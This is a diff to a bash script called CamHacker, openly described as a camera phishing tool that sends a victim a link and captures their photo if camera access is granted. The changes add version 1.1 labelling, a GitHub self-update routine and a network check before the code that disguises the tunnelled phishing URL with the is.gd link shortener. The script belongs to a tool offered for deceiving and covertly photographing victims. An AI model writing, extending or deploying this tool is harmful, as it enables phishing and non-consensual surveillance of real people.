@@ -1,6 +1,7 @@
 #!/bin/bash
 
 # CamHacker
+# Version    : 1.1
 # Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
 # Author     : KasRoudra
 # Github     : https://github.com/KasRoudra
@@ -23,9 +24,11 @@ white="\033[0;37m"
 nc="\033[00m"
 
 info="${cyan}[${white}+${cyan}] ${yellow}"
-ask="${cyan}[${white}?${cyan}] ${violate}"
+ask="${cyan}[${white}?${cyan}] ${purple}"
 error="${cyan}[${white}!${cyan}] ${red}"
 success="${cyan}[${white}√${cyan}] ${green}"
+
+version="1.1"
 
 cwd=`pwd`
 
@@ -98,7 +101,8 @@ ${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
 ${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
 ${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
 ${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
-${blue}                                      [By KasRoudra]
+${red}                                            [v1.1]
+${blue}                                    [By KasRoudra]
 "
 
 killer() {
@@ -162,6 +166,7 @@ replacer() {
     sleep 1
     echo -e "${success}URL 1 > ${1}\n"
     sleep 1
+    netcheck
     masked=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${1})
     if ! [[ -z $masked ]]; then
         echo -e "${success}URL 2 > ${masked}\n"
@@ -225,7 +230,6 @@ if [ `pidof ngrok > /dev/null 2>&1` ]; then
     echo -e "${error}Previous ngrok cannot be closed. Restart terminal!\007\n"
     killer; exit 1
 fi
-
 if $termux; then
     path=`pwd`
     if echo "$path" | grep -q "home"; then
@@ -288,6 +292,31 @@ if ! [[ -f $HOME/.ngrokfolder/ngrok || -f $HOME/.cffolder/cloudflared ]] ; then
     chmod +x $HOME/.cffolder/cloudflared
     fi
 fi
+netcheck
+git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/version.txt`
+if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
+    changelog=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log`
+    clear
+    echo -e "$logo"
+    echo -e "${info}CamHacker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
+        printf "${ask}Do you want to update CamHacker?${yellow}[y/n] > $green"
+        read upask
+        printf "$nc"
+        if [[ "$upask" == "y" ]]; then
+            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/KasRoudra/CamHacker
+            echo -e "\n${success}CamHacker updated successfully!!"
+            if [[ "$changelog" != "404: Not Found" ]]; then
+            echo -e "${purple}[•] Changelog:\n${blue}${changelog}"
+            fi
+            exit
+        elif [[ "$upask" == "n" ]]; then
+            echo -e "\n${info}Updating cancelled. Using old version!"
+            sleep 2
+        else
+            echo -e "\n${error}Wrong input!\n"
+            sleep 2
+        fi
+fi
 while true; do
 clear
 echo -e "$logo"
@@ -345,7 +374,7 @@ read option
         clear
         echo -e "$logo"
         echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
-$red[Version]    ${cyan} :[1.0]
+$red[Version]    ${cyan} :[1.1]
 $red[Description]${cyan} :[Camera Phishing tool]
 $red[Author]     ${cyan} :[KasRoudra]
 $red[Github]     ${cyan} :[https://github.com/KasRoudra] 
